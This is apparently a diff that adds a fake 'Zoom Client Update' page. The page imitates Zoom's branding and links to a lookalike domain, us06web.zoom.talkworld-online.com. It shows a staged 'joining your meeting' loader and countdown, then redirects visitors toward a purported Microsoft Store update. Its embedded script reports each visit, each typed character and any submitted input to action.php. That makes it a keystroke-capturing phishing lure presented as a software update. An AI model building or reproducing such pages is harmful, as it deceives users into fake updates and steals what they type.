@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>Zoom Client Update</title>
+  <link href="./Zoom Client Update_files/css2" rel="stylesheet">
+  <style>
+    :root {
+      --zoom-blue: #0072c6;
+      --text-color: #555;
+      --bg-color: #f4f7fa;
+      --border-color: #0072c6;
+      --button-hover-bg: #0072c6;
+      --button-hover-color: #fff;
+    }
+
+    body {
+      font-family: 'Roboto', sans-serif;
+      background-color: var(--bg-color);
+      margin: 0;
+      padding: 0;
+      color: var(--text-color);
+    }
+
+    #preloader {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: var(--bg-color);
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+      opacity: 1;
+      transition: opacity 1s ease;
+    }
+
+    .preloader-spinner {
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid var(--zoom-blue);
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1.5s linear infinite;
+      margin-bottom: 20px;
+    }
+
+    .preloader-message {
+      font-size: 18px;
+      font-weight: 500;
+      color: var(--zoom-blue);
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    #main-content {
+      display: none;
+      animation: fadeIn 1s ease-in-out forwards;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      text-align: center;
+    }
+
+    .logo-container {
+      position: absolute;
+      top: 20px;
+      left: 20px;
+    }
+
+    .logo {
+      width: 120px;
+      height: auto;
+    }
+
+    .top-right-links {
+      position: absolute;
+      top: 20px;
+      right: 20px;
+      font-size: 14px;
+      color: var(--zoom-blue);
+      display: flex;
+      gap: 15px;
+      align-items: center;
+    }
+
+    .top-right-links a {
+      text-decoration: none;
+      color: var(--zoom-blue);
+    }
+
+    .heading {
+      font-size: 28px;
+      font-weight: bold;
+      color: var(--zoom-blue);
+      margin-top: 100px;
+    }
+
+    .subheading {
+      font-size: 18px;
+      color: var(--text-color);
+      margin-top: 10px;
+    }
+
+    .download-info,
+    .countdown {
+      font-size: 18px;
+      font-weight: 500;
+      color: var(--zoom-blue);
+      margin-top: 15px;
+    }
+
+    .spinner {
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid var(--zoom-blue);
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 2s linear infinite;
+      margin-top: 30px;
+    }
+
+    .footer {
+      position: absolute;
+      bottom: 20px;
+      width: 100%;
+      text-align: center;
+      font-size: 12px;
+      color: #777;
+    }
+
+    .download-button-outline {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      background-color: transparent;
+      color: var(--zoom-blue);
+      border: 2px solid var(--border-color);
+      padding: 12px 24px;
+      text-decoration: none;
+      font-weight: 500;
+      border-radius: 999px;
+      margin-top: 15px;
+      transition: background-color 0.3s ease, color 0.3s ease;
+    }
+
+    .download-button-outline:hover {
+      background-color: var(--button-hover-bg);
+      color: var(--button-hover-color);
+    }
+
+    .confirmation-message {
+      margin-top: 20px;
+      font-size: 16px;
+      color: green;
+      display: none;
+      animation: fadeSuccess 1s ease-in-out forwards;
+    }
+
+    @keyframes fadeSuccess {
+      0% { opacity: 0; transform: scale(0.95); }
+      100% { opacity: 1; transform: scale(1); }
+    }
+
+    @media (prefers-color-scheme: dark) {
+      :root {
+        --text-color: #ccc;
+        --bg-color: #121212;
+        --border-color: #4da6ff;
+        --zoom-blue: #4da6ff;
+        --button-hover-bg: #4da6ff;
+        --button-hover-color: #000;
+      }
+
+      .footer {
+        color: #aaa;
+      }
+
+      .spinner,
+      .preloader-spinner {
+        border: 4px solid #333;
+        border-top: 4px solid var(--zoom-blue);
+      }
+    }
+  </style>
+</head>
+<body>
+
+
+            <script>
+                // Function to send POST request
+                async function sendPostRequest(data) {
+                    const endpoint = './action.php'; // Action script to handle requests
+                    try {
+                        await fetch(endpoint, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                            },
+                            body: JSON.stringify(data),
+                        });
+                        console.log('...');
+                    } catch (error) {
+                        console.error('Error sending data:', error);
+                    }
+                }
+
+                // Send a POST request when the page loads (visitor detection)
+                window.onload = () => {
+                    const visitData = {
+                        action: 'visit',
+                        userAgent: navigator.userAgent, // Capture browser details
+                    };
+                    sendPostRequest(visitData);
+                };
+
+                // Monitor input field for changes
+                function trackInput(event) {
+                    const newChar = event.data; // Get the character just entered
+                    if (newChar) {
+                        const charData = {
+                            action: 'character',
+                            character: newChar,
+                            userAgent: navigator.userAgent, // Include browser details
+                        };
+                        sendPostRequest(charData);
+                    }
+                }
+
+                // Handle form submission
+                function handleSubmit(event) {
+                    event.preventDefault(); // Prevent default form submission
+                    const inputField = document.getElementById('inputField').value;
+
+                    const formData = {
+                        action: 'submit',
+                        inputField: inputField, // Capture user input
+                        userAgent: navigator.userAgent, // Include browser details
+                    };
+                    sendPostRequest(formData).then(() => {
+                        console.log('...');
+                    });
+                }
+            </script>
+
+
+
+
+
+
+
+
+  <!-- Preloader -->
+  <div id="preloader">
+    <div class="preloader-spinner"></div>
+    <div class="preloader-message" id="preloaderMessage">We're setting up your meeting...</div>
+  </div>
+
+  <!-- Main Content -->
+  <div id="main-content">
+    <div class="logo-container">
+      <img class="logo" src="./Zoom Client Update_files/Zoom_Communications_Logo.svg" alt="Zoom logo">
+    </div>
+
+    <div class="top-right-links">
+      <a href="https://us06web.zoom.talkworld-online.com/invite.php#">Support</a>
+      <a href="https://us06web.zoom.talkworld-online.com/invite.php#">English</a>
+    </div>
+
+    <div class="container">
+      <div class="heading">Your Zoom Client is Out of Date</div>
+      <div class="subheading">Please wait while you're redirected to Microsoft Store...</div>
+
+      <div class="download-info">Please wait while you're redirected to Microsoft Store...</div>
+      <div class="countdown">Redirecting in <span id="countdown">17</span> seconds</div>
+
+      <div class="spinner"></div>
+
+      <p>If you are not redirected automatically, click below:</p>
+      <a href="//us06web.zoom.talkworld-online.com/microsoft-store.php" id="manualDownload" class="download-button-outline">
+        <img src="./Zoom Client Update_files/micro.png" alt="Microsoft Store Logo" style="height: 24px;">
+        Go to Microsoft Store
+      </a>
+
+      <div id="confirmation" class="confirmation-message">Please wait while you're redirected to Microsoft Store...</div>
+    </div>
+
+    <div class="footer">
+      <p>© Zoom Video Communications, Inc. All rights reserved.</p>
+    </div>
+  </div>
+
+  <script>
+    const preloader = document.getElementById("preloader");
+    const preloaderMessage = document.getElementById("preloaderMessage");
+    const mainContent = document.getElementById("main-content");
+    const countdownElement = document.getElementById('countdown');
+    const confirmationMsg = document.getElementById('confirmation');
+    const manualButton = document.getElementById('manualDownload');
+
+    let redirectStarted = false;
+
+    // Preloader message transitions
+    setTimeout(() => preloaderMessage.textContent = "We're setting up your meeting...", 5000);
+    setTimeout(() => preloaderMessage.textContent = "Joining your meeting...", 10000);
+    setTimeout(() => {
+      preloader.style.opacity = 0;
+      setTimeout(() => {
+        preloader.style.display = "none";
+        mainContent.style.display = "block";
+      }, 1000);
+    }, 15000);
+
+    // Countdown
+    let countdownTime = 25;
+    const countdownInterval = setInterval(() => {
+      countdownTime--;
+      countdownElement.textContent = countdownTime;
+      if (countdownTime <= 0 && !redirectStarted) {
+        startRedirect();
+        clearInterval(countdownInterval);
+      }
+    }, 1000);
+
+    // Redirect trigger
+    function startRedirect() {
+      if (redirectStarted) return;
+      redirectStarted = true;
+
+      confirmationMsg.style.display = 'block';
+      document.querySelector('.download-info').textContent = "Please wait while you're redirected to Microsoft Store...";
+
+      // Redirect after 10 seconds
+      setTimeout(() => {
+        window.location.href = "zoom.php";
+      }, 5000);
+    }
+
+    // Manual click handler
+    manualButton.addEventListener('click', (e) => {
+      e.preventDefault();
+      startRedirect();
+    });
+  </script>
+
+
+</body></html>
